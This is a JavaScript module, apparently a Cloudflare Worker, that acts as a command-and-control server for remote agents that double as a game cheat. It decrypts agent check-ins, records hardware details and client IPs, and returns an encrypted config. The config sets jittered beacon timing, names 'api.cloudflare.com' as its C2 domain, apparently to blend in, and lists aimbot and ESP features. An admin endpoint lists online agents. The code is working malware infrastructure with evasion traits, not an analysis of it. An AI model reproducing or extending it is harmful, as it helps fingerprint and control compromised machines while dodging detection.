import { decryptPayload, encryptResponse } from '../crypto.js';
import { agents } from './beacon.js';

export async function handleRegister(request, env, agentId, body) {
  if (!body) {
    return new Response(JSON.stringify({error: 'Empty registration'}), {status: 400, headers: {'Content-Type': 'application/json'}});
  }
  
  try {
    const decrypted = await decryptPayload(body, env.MASTER_KEY);
    if (!decrypted) {
      return new Response(JSON.stringify({error: 'Decryption failed'}), {status: 400, headers: {'Content-Type': 'application/json'}});
    }
    
    const reg = JSON.parse(new TextDecoder().decode(decrypted));
    
    // Store agent info
    const agent = {
      id: agentId,
      hw_id: reg.hw_id || '',
      os: reg.os || '',
      cpu: reg.cpu || '',
      gpu: reg.gpu || '',
      ram: reg.ram || '',
      ip: request.headers.get('CF-Connecting-IP') || '',
      first_seen: Date.now(),
      last_seen: Date.now(),
      version: reg.version || 0,
      commands: []
    };
    
    agents.set(agentId, agent);
    
    // Send initial config
    const config = {
      beacon_interval: [2000, 8000],
      c2_domains: ['api.cloudflare.com'],
      features: {
        esp: true,
        aimbot: true,
        speedhack: true,
        no_recoil: true,
        item_esp: true
      }
    };
    
    const encrypted = await encryptResponse(config, env.MASTER_KEY);
    return new Response(encrypted, {status: 200, headers: {'Content-Type': 'application/octet-stream'}});
    
  } catch (e) {
    return new Response(JSON.stringify({error: 'Registration failed'}), {status: 400, headers: {'Content-Type': 'application/json'}});
  }
}

// Admin: list all agents
export async function listAgents(request, env) {
  const auth = request.headers.get('Authorization');
  if (auth !== `Bearer ${env.ADMIN_TOKEN}`) {
    return new Response(JSON.stringify({error: 'Unauthorized'}), {status: 401});
  }
  
  const agentList = Array.from(agents.values()).map(a => ({
    id: a.id,
    hw_id: a.hw_id,
    os: a.os,
    last_seen: a.last_seen,
    version: a.version,
    online: Date.now() - a.last_seen < 30000
  }));
  
  return new Response(JSON.stringify(agentList), {status: 200, headers: {'Content-Type': 'application/json'}});
}